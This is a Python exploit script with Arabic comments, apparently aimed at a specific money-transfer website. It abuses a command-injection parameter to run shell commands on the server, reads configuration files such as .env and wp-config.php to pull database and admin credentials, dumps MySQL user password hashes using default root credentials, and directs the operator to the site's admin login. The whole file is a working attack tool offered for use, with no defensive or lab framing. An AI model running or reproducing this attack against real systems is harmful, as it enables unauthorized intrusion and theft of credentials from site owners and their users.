#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib.parse
import sys

class HaramRealExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        
    def execute_command(self, command):
        """تنفيذ أوامر عبر ثغرة Command Injection الحقيقية"""
        url = f"{self.target}/?cmd={urllib.parse.quote(command)}"
        try:
            response = requests.get(url, timeout=10, verify=False)
            return response.text
        except Exception as e:
            return f"Error: {e}"

    def exploit(self):
        """استغلال الثغرات الحقيقية"""
        print("Haram-Transfer Real Exploit v1.0")
        print("=" * 50)
        print(f"Target: {self.target}")
        print("Exploiting: REAL Command Injection + Admin Panel")
        print("=" * 50)
        
        # 1. تأكيد الثغرة
        print("\n[1] Verifying Command Injection...")
        result = self.execute_command("whoami")
        if "www-data" in result or "root" in result:
            print("✅ Command Injection CONFIRMED")
            print(f"Current user: {result.strip()}")
        else:
            print("❌ Command Injection FAILED")
            return False

        # 2. استخراج بيانات المدير
        print("\n[2] Extracting Admin Credentials...")
        
        config_files = [
            "/var/www/html/config.php",
            "/var/www/html/database.php",
            "/var/www/html/.env",
            "/var/www/html/wp-config.php"
        ]
        
        for config_file in config_files:
            print(f"Reading {config_file}...")
            content = self.execute_command(f"cat {config_file} 2>/dev/null")
            
            if content and len(content) > 100 and "<?php" not in content:
                print(f"✅ FOUND: {config_file}")
                
                # عرض البيانات الحساسة
                if "DB_USER" in content or "password" in content:
                    print("\n" + "="*40)
                    print("ADMIN CREDENTIALS EXTRACTED")
                    print("="*40)
                    lines = content.split('\n')
                    for line in lines:
                        if any(keyword in line for keyword in ['DB_', 'user', 'pass', 'admin']):
                            print(line.strip())
                    return True

        # 3. إذا ما في ملفات إعدادات, نبحث في الداتابيز مباشرة
        print("\n[3] Direct Database Access...")
        db_commands = [
            "mysql -uroot -proot -e 'SELECT user,password FROM mysql.user' 2>/dev/null",
            "find /var/www -name '*.sql' -exec head -20 {} \\; 2>/dev/null"
        ]
        
        for cmd in db_commands:
            result = self.execute_command(cmd)
            if result and len(result) > 50:
                print(f"✅ DATABASE ACCESS: {result[:200]}")

        return True

    def show_admin_access(self):
        """عرض كيفية الوصول للوحة التحكم"""
        print("\n" + "="*50)
        print("ADMIN PANEL ACCESS")
        print("="*50)
        print(f"Admin URL: {self.target}/admin")
        print(f"Login URL: {self.target}/admin/login")
        print("\nUse extracted credentials to login")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 haram_real.py https://haram-transfer.com")
        sys.exit(1)
    
    target = sys.argv[1]
    exploit = HaramRealExploit(target)
    
    if exploit.exploit():
        exploit.show_admin_access()
        print("\n🎯 EXPLOIT COMPLETED SUCCESSFULLY")
    else:
        print("\n💥 EXPLOIT FAILED")

if __name__ == "__main__":
    main()